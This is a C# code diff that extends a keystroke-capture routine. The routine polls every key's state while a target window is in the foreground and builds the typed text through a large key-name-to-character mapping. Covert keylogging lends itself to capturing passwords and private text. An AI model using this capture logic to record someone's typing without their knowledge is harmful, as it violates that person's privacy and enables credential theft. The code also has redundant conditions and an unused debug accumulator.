@@ -217,9 +217,10 @@ namespace MavenAsDemo
             while (WindowhandleToLog == GetForegroundWindow())
             {
 
-
+                string debug="";
                 foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
                 {
+                    debug+="\r\n"+((Keys)i).ToString();;
                     int keyState = GetAsyncKeyState(i);
                     if (keyState == 1 || keyState == -32767)
                     {
@@ -235,12 +236,13 @@ namespace MavenAsDemo
                         else
                         {
                             string k = ((Keys)i).ToString();
-                            if (k.Length == 2 && k.StartsWith("D"))
+                            /*if (k.Length == 2 && k.StartsWith("D"))
                             {
                                 k = k.Substring(1);
                             }
                             else if (k.Contains("ShiftKey")) { k = ""; }//handle shift keys through the close-enough function. 
-                            rtn += k.Replace("NumPad", "Oem");
+                            rtn += k.Replace("NumPad", "Oem");*/
+                            rtn += keycatchFormat(k);
                             break;
                         }
                     }
@@ -271,6 +273,11 @@ namespace MavenAsDemo
             rtn = rtn.Replace(">", ".");
             rtn = rtn.Replace("<", ",");
             rtn = rtn.Replace("?", "/");
+            rtn = rtn.Replace("'", "\"");
+            rtn = rtn.Replace("|", "\\");
+            rtn = rtn.Replace("{", "[");
+            rtn = rtn.Replace("}", "]");
+            rtn = rtn.Replace(":", ";");
             return rtn;
         }
         /// <summary>
@@ -282,19 +289,170 @@ namespace MavenAsDemo
         /// <returns>the best we can do to get the exact string.</returns>
         private string keycatchFormat(string input)
         {
-            //"LButtonShiftKeyRShiftKey1"
-            input = input.Replace("Oem1", "1");
-            input = input.Replace("Oem2", "2");
-            input = input.Replace("Oem3", "3");
-            input = input.Replace("Oem4", "4");
-            input = input.Replace("Oem5", "5");
-            input = input.Replace("Oem6", "6");
-            input = input.Replace("Oem7", "7");
-            input = input.Replace("Oem8", "8");
-            input = input.Replace("Oem9", "9");
-            input = input.Replace("Oem0", "0");
-            input = input.Replace("Oemcomma", ",");
-            input = input.Replace("OemMinus", "-");
+            if (input == "None"
+                || input == "LButton"
+                || input == "RButton"
+                || input == "Cancel"
+                || input == "MButton"
+                || input == "XButton1"
+                || input == "XButton2"
+                || input == "Tab"
+                || input == "LineFeed"
+                || input == "Clear"
+                || input == "Return"
+                || input == "Return"
+                || input == "ShiftKey"
+                || input == "ControlKey"
+                || input == "Menu"
+                || input == "Pause"
+                || input == "Capital"
+                || input == "Capital"
+                || input == "KanaMode"
+                || input == "KanaMode"
+                || input == "KanaMode"
+                || input == "JunjaMode"
+                || input == "FinalMode"
+                || input == "HanjaMode"
+                || input == "HanjaMode"
+                || input == "Escape"
+                || input == "IMEConvert"
+                || input == "IMENonconvert"
+                || input == "IMEAceept"
+                || input == "IMEAceept"
+                || input == "IMEModeChange"
+                || input == "PageUp"
+                || input == "PageUp"
+                || input == "Next"
+                || input == "Next"
+                || input == "End"
+                || input == "Home"
+                || input == "Left"
+                || input == "Up"
+                || input == "Right"
+                || input == "Down"
+                || input == "Select"
+                || input == "Print"
+                || input == "Execute"
+                || input == "PrintScreen"
+                || input == "PrintScreen"
+                || input == "Insert"
+                || input == "Help"
+                || input == "LWin"
+                || input == "RWin"
+                || input == "Apps"
+                || input == "Sleep"
+                || input == "Separator"
+                || input == "F1"
+                || input == "F2"
+                || input == "F3"
+                || input == "F4"
+                || input == "F5"
+                || input == "F6"
+                || input == "F7"
+                || input == "F8"
+                || input == "F9"
+                || input == "F10"
+                || input == "F11"
+                || input == "F12"
+                || input == "F13"
+                || input == "F14"
+                || input == "F15"
+                || input == "F16"
+                || input == "F17"
+                || input == "F18"
+                || input == "F19"
+                || input == "F20"
+                || input == "F21"
+                || input == "F22"
+                || input == "F23"
+                || input == "F24"
+                || input == "NumLock"
+                || input == "Scroll"
+                || input == "LShiftKey"
+                || input == "RShiftKey"
+                || input == "LControlKey"
+                || input == "RControlKey"
+                || input == "LMenu"
+                || input == "RMenu"
+                || input == "BrowserBack"
+                || input == "BrowserForward"
+                || input == "BrowserRefresh"
+                || input == "BrowserStop"
+                || input == "BrowserSearch"
+                || input == "BrowserFavorites"
+                || input == "BrowserHome"
+                || input == "VolumeMute"
+                || input == "VolumeDown"
+                || input == "VolumeUp"
+                || input == "MediaNextTrack"
+                || input == "MediaPreviousTrack"
+                || input == "MediaStop"
+                || input == "MediaPlayPause"
+                || input == "LaunchMail"
+                || input == "SelectMedia"
+                || input == "LaunchApplication1"
+                || input == "LaunchApplication2"
+                || input == "ProcessKey"
+                || input == "Packet"
+                || input == "Attn"
+                || input == "Crsel"
+                || input == "Exsel"
+                || input == "EraseEof"
+                || input == "Play"
+                || input == "Zoom"
+                || input == "NoName"
+                || input == "Pa1"
+                || input == "OemClear"
+                || input == "KeyCode"
+                || input == "Shift"
+                || input == "Control"
+                || input == "Alt"
+                || input == "Modifiers"
+            )
+            {
+                input = "";
+            }
+            else if (input == "Space") { input = " "; }
+            else if (input == "Subtract") { input = "-"; }
+            else if (input == "OemMinus") { input = "-"; }
+            else if (input == "Multiply") { input = "*"; }
+            else if (input == "Oemcomma") { input = ","; }
+            else if (input == "Decimal") { input = "."; }
+            else if (input == "OemPeriod") { input = "."; }
+            else if (input == "Divide") { input = "/"; }
+            else if (input == "OemQuestion") { input = "?"; }
+            else if (input == "OemOpenBrackets") { input = "["; }
+            else if (input == "OemBackslash") { input = "\\"; }
+            else if (input == "OemBackslash") { input = "\\"; }
+            else if (input == "Oemtilde") { input = "~"; }
+            else if (input == "Add") { input = "+"; }
+            else if (input == "Oemplus") { input = "+"; }
+            else if (input == "D0") { input = "0"; }
+            else if (input == "NumPad0") { input = "0"; }
+            else if (input == "D1") { input = "1"; }
+            else if (input == "NumPad1") { input = "1"; }
+            else if (input == "Oem1") { input = ";"; }
+            else if (input == "D2") { input = "2"; }
+            else if (input == "NumPad2") { input = "2"; }
+            else if (input == "D3") { input = "3"; }
+            else if (input == "NumPad3") { input = "3"; }
+            else if (input == "D4") { input = "4"; }
+            else if (input == "NumPad4") { input = "4"; }
+            else if (input == "D5") { input = "5"; }
+            else if (input == "NumPad5") { input = "5"; }
+            else if (input == "Oem5") { input = "\\"; }
+            else if (input == "D6") { input = "6"; }
+            else if (input == "NumPad6") { input = "6"; }
+            else if (input == "Oem6") { input = "]"; }
+            else if (input == "D7") { input = "7"; }
+            else if (input == "NumPad7") { input = "7"; }
+            else if (input == "Oem7") { input = "\""; }
+            else if (input == "D8") { input = "8"; }
+            else if (input == "NumPad8") { input = "8"; }
+            else if (input == "Oem8") { input = "8"; }
+            else if (input == "D9") { input = "9"; }
+            else if (input == "NumPad9") { input = "9"; }
+
             return input;
         }
         private string writeWindoInfo(int handle)
